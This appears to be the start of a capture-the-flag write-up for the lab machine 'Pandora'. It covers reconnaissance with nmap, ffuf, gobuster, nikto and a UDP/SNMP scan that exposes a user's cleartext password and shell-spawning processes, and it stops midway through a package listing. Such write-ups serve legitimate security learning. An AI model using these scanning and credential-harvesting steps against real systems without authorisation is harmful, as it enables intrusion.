# Pandora

First as usual, `nmap`.

```
# Nmap 7.92 scan initiated Sat Jan 15 15:27:30 2022 as: nmap -vvv -p 22,80 -sCV -oA init 10.10.11.136
Nmap scan report for 10.10.11.136
Host is up, received syn-ack (0.071s latency).
Scanned at 2022-01-15 15:27:44 +07 for 12s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDPIYGoHvNFwTTboYexVGcZzbSLJQsxKopZqrHVTeF8oEIu0iqn7E5czwVkxRO/icqaDqM+AB3QQVcZSDaz//XoXsT/NzNIbb9SERrcK/n8n9or4IbXBEtXhRvltS8NABsOTuhiNo/2fdPYCVJ/HyF5YmbmtqUPols6F5y/MK2Yl3eLMOdQQeax4AWSKVAsR+issSZlN2rADIvpboV7YMoo3ktlHKz4hXlX6FWtfDN/ZyokDNNpgBbr7N8zJ87+QfmNuuGgmcZzxhnzJOzihBHIvdIM4oMm4IetfquYm1WKG3s5q70jMFrjp4wCyEVbxY+DcJ54xjqbaNHhVwiSWUZnAyWe4gQGziPdZH2ULY+n3iTze+8E4a6rxN3l38d1r4THoru88G56QESiy/jQ8m5+Ang77rSEaT3Fnr6rnAF5VG1+kiA36rMIwLabnxQbAWnApRX9CHBpMdBj7v8oLhCRn7ZEoPDcD1P2AASdaDJjRMuR52YPDlUSDd8TnI/DFFs=
|   256 b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNNJGh4HcK3rlrsvCbu0kASt7NLMvAUwB51UnianAKyr9H0UBYZnOkVZhIjDea3F/CxfOQeqLpanqso/EqXcT9w=
|   256 e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOCMYY9DMj/I+Rfosf+yMuevI7VFIeeQfZSxq67EGxsb
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Play | Landing
| http-methods:
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-favicon: Unknown favicon MD5: 115E49F9A03BB97DEB840A3FE185434C
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jan 15 15:27:56 2022 -- 1 IP address (1 host up) scanned in 25.33 seconds
```

Visiting the website on port 80, we quickly see the domain name `panda.htb` so we add that to our `/etc/hosts`. Visiting with the name doesn't seem to immediately give anything different from using the IP address though. With the domain name, we can fuzz for virtual hosting.

```sh
$ ffuf -u 'http://panda.htb/' -H 'Host: FUZZ.panda.htb' -w ~/tools/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -fs 33560
```

However, that gives us nothing new.

At the bottom of the home page, we also see a couple of email addresses which can potentially be used later: `support@panda.htb` & `contact@panda.htb`. At the bottom is also the form "Send us a Message" which, when submitted, just makes a get request to the home page with a few URL parameters and we don't get anything special in response.

```
http://panda.htb/?fullName=a&email=a%40a.com&phone=a&message=a
```

I then also ran `gobuster` to fuzz for directories.

```sh
$ gobuster dir -u 'http://panda.htb/' -w ~/tools/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x html -r
/assets               (Status: 200) [Size: 1688]
/index.html           (Status: 200) [Size: 33560]
/server-status        (Status: 403) [Size: 274]
```

Nothing interesting was found it seems. I also tried running `nikto`.

```sh
$ nikto -host 'http://panda.htb/' -output `pwd`/nikto.txt

- Nikto v2.1.6/2.1.5
+ Target Host: panda.htb
+ Target Port: 80
+ GET Server leaks inodes via ETags, header found with file /, fields: 0x8318 0x5d23e548bc656
+ GET The anti-clickjacking X-Frame-Options header is not present.
+ GET The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ GET The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ OPTIONS Allowed HTTP Methods: POST, OPTIONS, HEAD, GET
```

Unfortunately, that doesn't give us much either. With nothing to go off of, I tried running a UDP scan.

```
# Nmap 7.92 scan initiated Sat Jan 15 17:12:36 2022 as: nmap -sUCV -oA udp panda.htb
Increasing send delay for 10.10.11.136 from 200 to 400 due to 11 out of 11 dropped probes since last increase.
Nmap scan report for panda.htb (10.10.11.136)
Host is up (0.12s latency).
Scanned at 2022-01-15 17:12:36 +07 for 1586s
Not shown: 999 closed udp ports (port-unreach)
PORT    STATE SERVICE VERSION
161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
| snmp-processes:
|   1:
|     Name: systemd
|     Path: /sbin/init
|     Params: maybe-ubiquity
|   2:
|     Name: kthreadd
|   3:
|     Name: rcu_gp
|   4:
|     Name: rcu_par_gp
|   6:
|     Name: kworker/0:0H-kblockd
|   9:
|     Name: mm_percpu_wq
|   10:
|     Name: ksoftirqd/0
|   11:
|     Name: rcu_sched
|   12:
|     Name: migration/0
|   13:
|     Name: idle_inject/0
|   14:
|     Name: cpuhp/0
|   15:
|     Name: cpuhp/1
|   16:
|     Name: idle_inject/1
|   17:
|     Name: migration/1
|   18:
|     Name: ksoftirqd/1
|   20:
|     Name: kworker/1:0H-kblockd
|   21:
|     Name: kdevtmpfs
|   22:
|     Name: netns
|   23:
|     Name: rcu_tasks_kthre
|   24:
|     Name: kauditd
|   25:
|     Name: khungtaskd
|   26:
|     Name: oom_reaper
|   27:
|     Name: writeback
|   28:
|     Name: kcompactd0
|   29:
|     Name: ksmd
|   30:
|     Name: khugepaged
|   77:
|     Name: kintegrityd
|   78:
|     Name: kblockd
|   79:
|     Name: blkcg_punt_bio
|   80:
|     Name: tpm_dev_wq
|   81:
|     Name: ata_sff
|   82:
|     Name: md
|   83:
|     Name: edac-poller
|   84:
|     Name: devfreq_wq
|   85:
|     Name: watchdogd
|   88:
|     Name: kswapd0
|   89:
|     Name: ecryptfs-kthrea
|   91:
|     Name: kthrotld
|   92:
|     Name: irq/24-pciehp
|   93:
|     Name: irq/25-pciehp
|   94:
|     Name: irq/26-pciehp
|   95:
|     Name: irq/27-pciehp
|   96:
|     Name: irq/28-pciehp
|   97:
|     Name: irq/29-pciehp
|   98:
|     Name: irq/30-pciehp
|   99:
|     Name: irq/31-pciehp
|   100:
|     Name: irq/32-pciehp
|   101:
|     Name: irq/33-pciehp
|   102:
|     Name: irq/34-pciehp
|   103:
|     Name: irq/35-pciehp
|   104:
|     Name: irq/36-pciehp
|   105:
|     Name: irq/37-pciehp
|   106:
|     Name: irq/38-pciehp
|   107:
|     Name: irq/39-pciehp
|   108:
|     Name: irq/40-pciehp
|   109:
|     Name: irq/41-pciehp
|   110:
|     Name: irq/42-pciehp
|   111:
|     Name: irq/43-pciehp
|   112:
|     Name: irq/44-pciehp
|   113:
|     Name: irq/45-pciehp
|   114:
|     Name: irq/46-pciehp
|   115:
|     Name: irq/47-pciehp
|   116:
|     Name: irq/48-pciehp
|   117:
|     Name: irq/49-pciehp
|   118:
|     Name: irq/50-pciehp
|   119:
|     Name: irq/51-pciehp
|   120:
|     Name: irq/52-pciehp
|   121:
|     Name: irq/53-pciehp
|   122:
|     Name: irq/54-pciehp
|   123:
|     Name: irq/55-pciehp
|   124:
|     Name: acpi_thermal_pm
|   125:
|     Name: scsi_eh_0
|   126:
|     Name: scsi_tmf_0
|   127:
|     Name: scsi_eh_1
|   128:
|     Name: scsi_tmf_1
|   130:
|     Name: vfio-irqfd-clea
|   131:
|     Name: ipv6_addrconf
|   141:
|     Name: kstrp
|   144:
|     Name: kworker/u5:0
|   157:
|     Name: charger_manager
|   202:
|     Name: mpt_poll_0
|   203:
|     Name: scsi_eh_2
|   204:
|     Name: mpt/0
|   205:
|     Name: scsi_tmf_2
|   206:
|     Name: scsi_eh_3
|   208:
|     Name: scsi_tmf_3
|   209:
|     Name: scsi_eh_4
|   210:
|     Name: scsi_tmf_4
|   211:
|     Name: cryptd
|   212:
|     Name: scsi_eh_5
|   221:
|     Name: scsi_tmf_5
|   224:
|     Name: scsi_eh_6
|   227:
|     Name: scsi_tmf_6
|   229:
|     Name: scsi_eh_7
|   230:
|     Name: scsi_tmf_7
|   231:
|     Name: scsi_eh_8
|   234:
|     Name: scsi_tmf_8
|   236:
|     Name: scsi_eh_9
|   240:
|     Name: scsi_tmf_9
|   242:
|     Name: scsi_eh_10
|   244:
|     Name: scsi_tmf_10
|   245:
|     Name: scsi_eh_11
|   247:
|     Name: scsi_tmf_11
|   248:
|     Name: scsi_eh_12
|   250:
|     Name: scsi_tmf_12
|   251:
|     Name: scsi_eh_13
|   252:
|     Name: scsi_tmf_13
|   253:
|     Name: scsi_eh_14
|   254:
|     Name: scsi_tmf_14
|   255:
|     Name: scsi_eh_15
|   256:
|     Name: scsi_tmf_15
|   257:
|     Name: scsi_eh_16
|   258:
|     Name: scsi_tmf_16
|   259:
|     Name: scsi_eh_17
|   260:
|     Name: scsi_tmf_17
|   261:
|     Name: scsi_eh_18
|   262:
|     Name: scsi_tmf_18
|   263:
|     Name: scsi_eh_19
|   264:
|     Name: scsi_tmf_19
|   265:
|     Name: scsi_eh_20
|   266:
|     Name: scsi_tmf_20
|   267:
|     Name: scsi_eh_21
|   268:
|     Name: scsi_tmf_21
|   269:
|     Name: scsi_eh_22
|   270:
|     Name: scsi_tmf_22
|   271:
|     Name: scsi_eh_23
|   272:
|     Name: scsi_tmf_23
|   273:
|     Name: scsi_eh_24
|   274:
|     Name: scsi_tmf_24
|   275:
|     Name: scsi_eh_25
|   276:
|     Name: scsi_tmf_25
|   277:
|     Name: scsi_eh_26
|   278:
|     Name: scsi_tmf_26
|   279:
|     Name: scsi_eh_27
|   280:
|     Name: scsi_tmf_27
|   281:
|     Name: scsi_eh_28
|   282:
|     Name: scsi_tmf_28
|   283:
|     Name: scsi_eh_29
|   284:
|     Name: scsi_tmf_29
|   285:
|     Name: scsi_eh_30
|   286:
|     Name: scsi_tmf_30
|   287:
|     Name: scsi_eh_31
|   288:
|     Name: scsi_tmf_31
|   310:
|     Name: irq/16-vmwgfx
|   313:
|     Name: ttm_swap
|   330:
|     Name: scsi_eh_32
|   331:
|     Name: scsi_tmf_32
|   332:
|     Name: kworker/1:1H-kblockd
|   343:
|     Name: kdmflush
|   345:
|     Name: kdmflush
|   349:
|     Name: kworker/0:1H-kblockd
|   377:
|     Name: raid5wq
|   431:
|     Name: jbd2/dm-0-8
|   432:
|     Name: ext4-rsv-conver
|   489:
|     Name: systemd-journal
|     Path: /lib/systemd/systemd-journald
|   515:
|     Name: systemd-udevd
|     Path: /lib/systemd/systemd-udevd
|   526:
|     Name: systemd-network
|     Path: /lib/systemd/systemd-networkd
|   657:
|     Name: kaluad
|   658:
|     Name: kmpath_rdacd
|   659:
|     Name: kmpathd
|   660:
|     Name: kmpath_handlerd
|   661:
|     Name: multipathd
|     Path: /sbin/multipathd
|     Params: -d -s
|   669:
|     Name: jbd2/sda2-8
|   670:
|     Name: ext4-rsv-conver
|   688:
|     Name: systemd-resolve
|     Path: /lib/systemd/systemd-resolved
|   690:
|     Name: systemd-timesyn
|     Path: /lib/systemd/systemd-timesyncd
|   708:
|     Name: VGAuthService
|     Path: /usr/bin/VGAuthService
|   713:
|     Name: vmtoolsd
|     Path: /usr/bin/vmtoolsd
|   793:
|     Name: accounts-daemon
|     Path: /usr/lib/accountsservice/accounts-daemon
|   794:
|     Name: dbus-daemon
|     Path: /usr/bin/dbus-daemon
|     Params: --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
|   800:
|     Name: irqbalance
|     Path: /usr/sbin/irqbalance
|     Params: --foreground
|   801:
|     Name: networkd-dispat
|     Path: /usr/bin/python3
|     Params: /usr/bin/networkd-dispatcher --run-startup-triggers
|   803:
|     Name: rsyslogd
|     Path: /usr/sbin/rsyslogd
|     Params: -n -iNONE
|   805:
|     Name: systemd-logind
|     Path: /lib/systemd/systemd-logind
|   806:
|     Name: udisksd
|     Path: /usr/lib/udisks2/udisksd
|   818:
|     Name: cron
|     Path: /usr/sbin/cron
|     Params: -f
|   820:
|     Name: cron
|     Path: /usr/sbin/CRON
|     Params: -f
|   829:
|     Name: sh
|     Path: /bin/sh
|     Params: -c sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p HotelBabylon23'
|   862:
|     Name: apache2
|     Path: /usr/sbin/apache2
|     Params: -k start
|   866:
|     Name: atd
|     Path: /usr/sbin/atd
|     Params: -f
|   867:
|     Name: snmpd
|     Path: /usr/sbin/snmpd
|     Params: -LOw -u Debian-snmp -g Debian-snmp -I -smux mteTrigger mteTriggerConf -f -p /run/snmpd.pid
|   868:
|     Name: sshd
|     Path: sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
|   994:
|     Name: mysqld
|     Path: /usr/sbin/mysqld
|   1008:
|     Name: polkitd
|     Path: /usr/lib/policykit-1/polkitd
|     Params: --no-debug
|   1018:
|     Name: agetty
|     Path: /sbin/agetty
|     Params: -o -p -- \u --noclear tty1 linux
|   1144:
|     Name: sshd
|     Path: sshd: daniel [priv]
|   1152:
|     Name: host_check
|     Path: /usr/bin/host_check
|     Params: -u daniel -p HotelBabylon23
|   1176:
|     Name: sshd
|     Path: sshd: daniel [priv]
|   1198:
|     Name: systemd
|     Path: /lib/systemd/systemd
|     Params: --user
|   1200:
|     Name: (sd-pam)
|     Path: (sd-pam)
|   1319:
|     Name: sshd
|     Path: sshd: daniel@pts/0
|   1321:
|     Name: bash
|     Path: -bash
|   1414:
|     Name: sshd
|     Path: sshd: daniel@pts/1
|   1415:
|     Name: bash
|     Path: -bash
|   1759:
|     Name: apache2
|     Path: /usr/sbin/apache2
|     Params: -k start
|   2123:
|     Name: apache2
|     Path: /usr/sbin/apache2
|     Params: -k start
|   3701:
|     Name: kworker/1:1-events
|   3716:
|     Name: sshd
|     Path: sshd: daniel [priv]
|   3812:
|     Name: sshd
|     Path: sshd: daniel@pts/2
|   3813:
|     Name: bash
|     Path: -bash
|   4152:
|     Name: apache2
|     Path: /usr/sbin/apache2
|     Params: -k start
|   4172:
|     Name: apache2
|     Path: /usr/sbin/apache2
|     Params: -k start
|   4184:
|     Name: apache2
|     Path: /usr/sbin/apache2
|     Params: -k start
|   4397:
|     Name: kworker/0:2-cgroup_destroy
|   4514:
|     Name: kworker/0:0-events
|   4615:
|     Name: kworker/u4:1-events_unbound
|   4730:
|     Name: apache2
|     Path: /usr/sbin/apache2
|     Params: -k start
|   4732:
|     Name: apache2
|     Path: /usr/sbin/apache2
|     Params: -k start
|   4765:
|   4766:
|     Name: kworker/1:2-events
|   4821:
|     Name: apache2
|     Path: /usr/sbin/apache2
|     Params: -k start
|   4855:
|     Name: apache2
|     Path: /usr/sbin/apache2
|     Params: -k start
|   4861:
|     Name: apache2
|     Path: /usr/sbin/apache2
|     Params: -k start
|   4869:
|     Name: apache2
|     Path: /usr/sbin/apache2
|     Params: -k start
|   4870:
|     Name: sh
|     Path: sh
|     Params: -c uname -a; w; id; /bin/bash -i
|   4874:
|     Name: bash
|     Path: /bin/bash
|     Params: -i
|   4926:
|     Name: python3
|     Path: python3
|     Params: -c import pty;pty.spawn("/bin/bash")
|   4927:
|     Name: bash
|     Path: /bin/bash
|   4995:
|     Name: apache2
|     Path: /usr/sbin/apache2
|     Params: -k start
|   5141:
|_    Name: kworker/u4:0-events_power_efficient
| snmp-win32-software:
|   accountsservice_0.6.55-0ubuntu12~20.04.5_amd64; 2021-12-07T12:57:21
|   adduser_3.118ubuntu2_all; 2021-02-01T17:21:32
|   alsa-topology-conf_1.2.2-1_all; 2021-02-01T17:25:18
|   alsa-ucm-conf_1.2.2-1ubuntu0.11_all; 2021-12-07T12:57:25
|   amd64-microcode_3.20191218.1ubuntu1_amd64; 2021-06-11T12:44:07
|   apache2-bin_2.4.41-4ubuntu3.8_amd64; 2021-12-07T12:57:07
|   apache2-data_2.4.41-4ubuntu3.8_all; 2021-12-07T12:57:07
|   apache2-utils_2.4.41-4ubuntu3.8_amd64; 2021-12-07T12:57:07
|   apache2_2.4.41-4ubuntu3.8_amd64; 2021-12-07T12:57:06
|   apparmor_2.13.3-7ubuntu5.1_amd64; 2021-02-01T17:25:03
|   apport-symptoms_0.23_all; 2021-02-01T17:25:23
|   apport_2.20.11-0ubuntu27.21_all; 2021-12-07T12:57:29
|   apt-transport-https_2.0.6_all; 2021-12-07T12:57:29
|   apt-utils_2.0.6_amd64; 2021-12-07T12:57:00
|   apt_2.0.6_amd64; 2021-12-07T12:56:59
|   at_3.1.23-1ubuntu1_amd64; 2021-02-01T17:25:23
|   base-files_11ubuntu5.4_amd64; 2021-12-07T12:56:49
|   base-passwd_3.5.47_amd64; 2021-02-01T17:20:55
|   bash-completion_1:2.10-1ubuntu1_all; 2021-02-01T17:25:05
|   bash_5.0-6ubuntu1.1_amd64; 2021-02-01T17:23:38
|   bc_1.07.1-2build1_amd64; 2021-02-01T17:25:23
|   bcache-tools_1.0.8-3ubuntu0.1_amd64; 2021-02-01T17:25:23
|   bind9-dnsutils_1:9.16.1-0ubuntu2.9_amd64; 2021-12-07T12:57:22
|   bind9-host_1:9.16.1-0ubuntu2.9_amd64; 2021-12-07T12:57:22
|   bind9-libs_1:9.16.1-0ubuntu2.9_amd64; 2021-12-07T12:57:22
|   bolt_0.8-4ubuntu1_amd64; 2021-02-01T17:25:23
|   bsdmainutils_11.1.2ubuntu3_amd64; 2021-02-01T17:24:50
|   bsdutils_1:2.34-0.1ubuntu9.1_amd64; 2021-02-01T17:23:38
|   btrfs-progs_5.4.1-2_amd64; 2021-02-01T17:25:24
|   busybox-initramfs_1:1.30.1-4ubuntu6.4_amd64; 2022-01-03T07:47:22
|   busybox-static_1:1.30.1-4ubuntu6.4_amd64; 2022-01-03T07:47:22
|   byobu_5.133-0ubuntu1_all; 2021-02-01T17:25:25
|   bzip2_1.0.8-2_amd64; 2021-02-01T17:21:58
|   ca-certificates_20210119~20.04.2_all; 2021-12-07T12:57:16
|   cloud-guest-utils_0.31-7-gd99b2d76-0ubuntu1_all; 2021-02-01T17:26:16
|   cloud-initramfs-copymods_0.45ubuntu2_all; 2021-12-07T12:58:00
|   cloud-initramfs-dyn-netconf_0.45ubuntu2_all; 2021-12-07T12:58:00
|   command-not-found_20.04.4_all; 2021-02-01T17:25:08
|   console-setup-linux_1.194ubuntu3_all; 2021-02-01T17:21:59
|   console-setup_1.194ubuntu3_all; 2021-02-01T17:21:58
|   coreutils_8.30-3ubuntu2_amd64; 2021-02-01T17:20:56
|   cpio_2.13+dfsg-2ubuntu0.3_amd64; 2021-12-07T12:57:22
|   crda_3.18-1build1_amd64; 2021-06-11T12:43:36
|   cron_3.0pl1-136ubuntu1_amd64; 2021-02-01T17:22:00
|   cryptsetup-bin_2:2.2.2-3ubuntu2.3_amd64; 2021-02-01T17:25:25
|   cryptsetup-initramfs_2:2.2.2-3ubuntu2.3_all; 2021-02-01T17:25:27
|   cryptsetup-run_2:2.2.2-3ubuntu2.3_all; 2021-02-01T17:25:28
|   cryptsetup_2:2.2.2-3ubuntu2.3_amd64; 2021-02-01T17:25:26
|   curl_7.68.0-1ubuntu2.7_amd64; 2021-12-07T12:57:03
|   dash_0.5.10.2-6_amd64; 2021-02-01T17:20:57
|   dbconfig-common_2.0.13_all; 2021-06-11T13:33:36
|   dbus-user-session_1.12.16-2ubuntu2.1_amd64; 2021-02-01T17:25:31
|   dbus_1.12.16-2ubuntu2.1_amd64; 2021-02-01T17:23:54
|   dconf-gsettings-backend_0.36.0-1_amd64; 2021-02-01T17:25:32
|   dconf-service_0.36.0-1_amd64; 2021-02-01T17:25:32
|   debconf-i18n_1.5.73_all; 2021-02-01T17:22:01
|   debconf_1.5.73_all; 2021-02-01T17:20:58
|   debianutils_4.9.1_amd64; 2021-02-01T17:20:58
|   diffutils_1:3.7-3_amd64; 2021-02-01T17:20:59
|   dirmngr_2.2.19-3ubuntu2.1_amd64; 2021-06-11T13:05:02
|   distro-info-data_0.43ubuntu1.9_all; 2021-12-07T12:57:16
|   distro-info_0.23ubuntu1_amd64; 2022-01-03T07:47:21
|   dmeventd_2:1.02.167-1ubuntu1_amd64; 2021-02-01T17:25:33
|   dmidecode_3.2-3_amd64; 2021-02-01T17:25:08
|   dmsetup_2:1.02.167-1ubuntu1_amd64; 2021-02-01T17:22:01
|   dosfstools_4.1-2_amd64; 2021-02-01T17:25:08
|   dpkg_1.19.7ubuntu3_amd64; 2021-02-01T17:21:00
|   e2fsprogs_1.45.5-2ubuntu1_amd64; 2021-02-01T17:21:00
|   ed_1.16-1_amd64; 2021-02-01T17:25:08
|   eject_2.1.5+deb1+cvs20081104-14_amd64; 2021-02-01T17:22:01
|   ethtool_1:5.4-1_amd64; 2021-02-01T17:25:34
|   fdisk_2.34-0.1ubuntu9.1_amd64; 2021-02-01T17:23:42
|   file_1:5.38-4_amd64; 2021-02-01T17:22:01
|   finalrd_6~ubuntu20.04.1_all; 2021-02-01T17:25:34
|   findutils_4.7.0-1ubuntu1_amd64; 2021-02-01T17:21:00
|   fontconfig-config_2.13.1-2ubuntu3_all; 2021-06-11T13:33:36
|   fontconfig_2.13.1-2ubuntu3_amd64; 2021-06-11T13:33:37
|   fonts-dejavu-core_2.37-1_all; 2021-06-11T13:33:36
|   fonts-liberation_1:1.07.4-11_all; 2021-06-11T13:33:36
|   fonts-ubuntu-console_0.83-4ubuntu1_all; 2021-02-01T17:25:34
|   friendly-recovery_0.2.41ubuntu0.20.04.1_all; 2021-06-11T13:05:08
|   ftp_0.17-34.1_amd64; 2021-02-01T17:25:09
|   fuse_2.9.9-3_amd64; 2021-02-01T17:24:52
|   fwupd-signed_1.27.1ubuntu5+1.5.11-0ubuntu1~20.04.2_amd64; 2022-01-03T07:47:22
|   fwupd_1.5.11-0ubuntu1~20.04.2_amd64; 2022-01-03T07:47:23
|   galera-3_25.3.29-1_amd64; 2021-06-11T13:33:31
|   gawk_1:5.0.1+dfsg-1_amd64; 2021-02-01T17:24:54
|   gcc-10-base_10.3.0-1ubuntu1~20.04_amd64; 2021-12-07T12:56:51
|   gdisk_1.0.5-1_amd64; 2021-02-01T17:26:24
|   geoip-database_20191224-2_all; 2021-06-11T13:30:13
|   gettext-base_0.19.8.1-10build1_amd64; 2021-02-01T17:25:09
|   gir1.2-glib-2.0_1.64.1-1~ubuntu20.04.1_amd64; 2021-02-01T17:24:09
|   gir1.2-packagekitglib-1.0_1.1.13-2ubuntu1.1_amd64; 2021-02-01T17:25:41
|   git-man_1:2.25.1-1ubuntu3.2_all; 2021-12-07T12:57:23
|   git_1:2.25.1-1ubuntu3.2_amd64; 2021-12-07T12:57:25
|   glib-networking-common_2.64.2-1ubuntu0.1_all; 2021-02-01T17:25:34
|   glib-networking-services_2.64.2-1ubuntu0.1_amd64; 2021-02-01T17:25:35
|   glib-networking_2.64.2-1ubuntu0.1_amd64; 2021-02-01T17:25:35
|   gnupg-l10n_2.2.19-3ubuntu2.1_all; 2021-06-11T13:05:03
|   gnupg-utils_2.2.19-3ubuntu2.1_amd64; 2021-06-11T13:05:02
|   gnupg_2.2.19-3ubuntu2.1_all; 2021-06-11T13:05:03
|   gpg-agent_2.2.19-3ubuntu2.1_amd64; 2021-06-11T13:05:02
|   gpg-wks-client_2.2.19-3ubuntu2.1_amd64; 2021-06-11T13:05:02
|   gpg-wks-server_2.2.19-3ubuntu2.1_amd64; 2021-06-11T13:05:02
|   gpg_2.2.19-3ubuntu2.1_amd64; 2021-06-11T13:05:02
|   gpgconf_2.2.19-3ubuntu2.1_amd64; 2021-06-11T13:05:02
|   gpgsm_2.2.19-3ubuntu2.1_amd64; 2021-06-11T13:05:03
|   gpgv_2.2.19-3ubuntu2.1_amd64; 2021-06-11T13:05:03
|   graphviz_2.42.2-3build2_amd64; 2021-06-11T13:33:40
|   grep_3.4-1_amd64; 2021-02-01T17:21:01
|   groff-base_1.22.4-4build1_amd64; 2021-02-01T17:24:51
|   grub-common_2.04-1ubuntu26.13_amd64; 2021-12-07T12:57:27
|   grub-gfxpayload-lists_0.7_amd64; 2021-06-11T12:43:37
|   grub-pc-bin_2.04-1ubuntu26.13_amd64; 2021-12-07T12:57:26
|   grub-pc_2.04-1ubuntu26.13_amd64; 2021-12-07T12:57:26
|   grub2-common_2.04-1ubuntu26.13_amd64; 2021-12-07T12:57:26
|   gsettings-desktop-schemas_3.36.0-1ubuntu1_all; 2021-02-01T17:25:35
|   gzip_1.10-0ubuntu4_amd64; 2021-02-01T17:21:01
|   hdparm_9.58+ds-4_amd64; 2021-02-01T17:25:09
|   hostname_3.23_amd64; 2021-02-01T17:21:02
|   htop_2.2.0-2build1_amd64; 2021-02-01T17:25:45
|   ifupdown_0.8.35ubuntu1_amd64; 2021-11-23T11:48:05
|   info_6.7.0.dfsg.2-5_amd64; 2021-02-01T17:25:09
|   init-system-helpers_1.57_all; 2021-02-01T17:21:02
|   init_1.57_amd64; 2021-02-01T17:22:02
|   initramfs-tools-bin_0.136ubuntu6.6_amd64; 2021-12-07T12:57:29
|   initramfs-tools-core_0.136ubuntu6.6_all; 2021-12-07T12:57:29
|   initramfs-tools_0.136ubuntu6.6_all; 2021-12-07T12:57:29
|   install-info_6.7.0.dfsg.2-5_amd64; 2021-02-01T17:24:47
|   intel-microcode_3.20210608.0ubuntu0.20.04.1_amd64; 2021-06-11T12:44:07
|   iproute2_5.5.0-1ubuntu1_amd64; 2021-02-01T17:22:03
|   iptables_1.8.4-3ubuntu2_amd64; 2021-02-01T17:25:10
|   iputils-ping_3:20190709-3_amd64; 2021-02-01T17:22:03
|   iputils-tracepath_3:20190709-3_amd64; 2021-02-01T17:25:10
|   irqbalance_1.6.0-3ubuntu1_amd64; 2021-02-01T17:24:47
|   isc-dhcp-client_4.4.1-2.1ubuntu5.20.04.2_amd64; 2021-06-11T12:48:18
|   isc-dhcp-common_4.4.1-2.1ubuntu5.20.04.2_amd64; 2021-06-11T12:46:47
|   iso-codes_4.4-1_all; 2021-02-01T17:24:49
|   iucode-tool_2.3.1-1_amd64; 2021-06-11T12:43:37
|   iw_5.4-1_amd64; 2021-06-11T12:43:36
|   kbd_2.0.4-4ubuntu2_amd64; 2021-02-01T17:22:05
|   keyboard-configuration_1.194ubuntu3_all; 2021-02-01T17:22:05
|   klibc-utils_2.0.7-1ubuntu5_amd64; 2021-02-01T17:25:26
|   kmod_27-1ubuntu2_amd64; 2021-02-01T17:22:06
|   kpartx_0.8.3-1ubuntu2_amd64; 2021-02-01T17:26:16
|   krb5-locales_1.17-6ubuntu4.1_all; 2021-02-01T17:25:10
|   landscape-common_19.12-0ubuntu4.2_amd64; 2021-06-11T13:05:12
|   language-selector-common_0.204.2_all; 2021-02-01T17:24:50
|   less_551-1ubuntu0.1_amd64; 2021-02-01T17:24:09
|   libaccountsservice0_0.6.55-0ubuntu12~20.04.5_amd64; 2021-12-07T12:57:22
|   libacl1_2.2.53-6_amd64; 2021-02-01T17:21:02
|   libaio1_0.3.112-5_amd64; 2021-02-01T17:25:33
|   libalgorithm-c3-perl_0.10-1_all; 2021-06-11T13:30:13
|   libann0_1.1.2+doc-7build1_amd64; 2021-06-11T13:33:37
|   libapache2-mod-php7.4_7.4.3-4ubuntu2.8_amd64; 2022-01-03T07:47:26
|   libapache2-mpm-itk_2.4.7-04-1_amd64; 2021-06-11T14:07:07
|   libapparmor1_2.13.3-7ubuntu5.1_amd64; 2021-02-01T17:23:54
|   libappstream4_0.12.10-2_amd64; 2021-02-01T17:25:49
|   libapr1_1.6.5-1ubuntu1_amd64; 2021-06-11T13:31:27
|   libaprutil1-dbd-sqlite3_1.6.1-4ubuntu2_amd64; 2021-06-11T13:31:27
|   libaprutil1-ldap_1.6.1-4ubuntu2_amd64; 2021-06-11T13:31:27
|   libaprutil1_1.6.1-4ubuntu2_amd64; 2021-06-11T13:31:27
|   libapt-pkg6.0_2.0.6_amd64; 2021-12-07T12:56:57
|   libarchive13_3.4.0-2ubuntu1_amd64; 2021-02-01T17:25:35
|   libargon2-1_0~20171227-0.2_amd64; 2021-02-01T17:21:32
|   libasn1-8-heimdal_7.7.0+dfsg-1ubuntu1_amd64; 2021-02-01T17:25:28
|   libasound2-data_1.2.2-2.1ubuntu2.5_all; 2021-12-07T12:57:25
|   libasound2_1.2.2-2.1ubuntu2.5_amd64; 2021-12-07T12:57:25
|   libassuan0_2.5.3-7ubuntu2_amd64; 2021-02-01T17:25:32
|   libatasmart4_0.19-5_amd64; 2022-01-03T07:47:28
|   libatm1_1:2.5.1-4_amd64; 2021-02-01T17:22:07
|   libattr1_1:2.4.48-5_amd64; 2021-02-01T17:21:02
|   libaudit-common_1:2.8.5-2ubuntu6_all; 2021-02-01T17:21:02
|   libaudit1_1:2.8.5-2ubuntu6_amd64; 2021-02-01T17:21:03
|   libauthen-sasl-perl_2.1600-1_all; 2021-06-11T13:30:18
|   libb-hooks-endofscope-perl_0.24-1_all; 2021-06-11T13:30:14
|   libb-hooks-op-check-perl_0.22-1build2_amd64; 2021-06-11T13:30:13
|   libblas3_3.9.0-1build1_amd64; 2021-06-11T13:30:11
|   libblkid1_2.34-0.1ubuntu9.1_amd64; 2021-02-01T17:23:41
|   libblockdev-crypto2_2.23-2ubuntu3_amd64; 2022-01-03T07:47:29
|   libblockdev-fs2_2.23-2ubuntu3_amd64; 2022-01-03T07:47:29
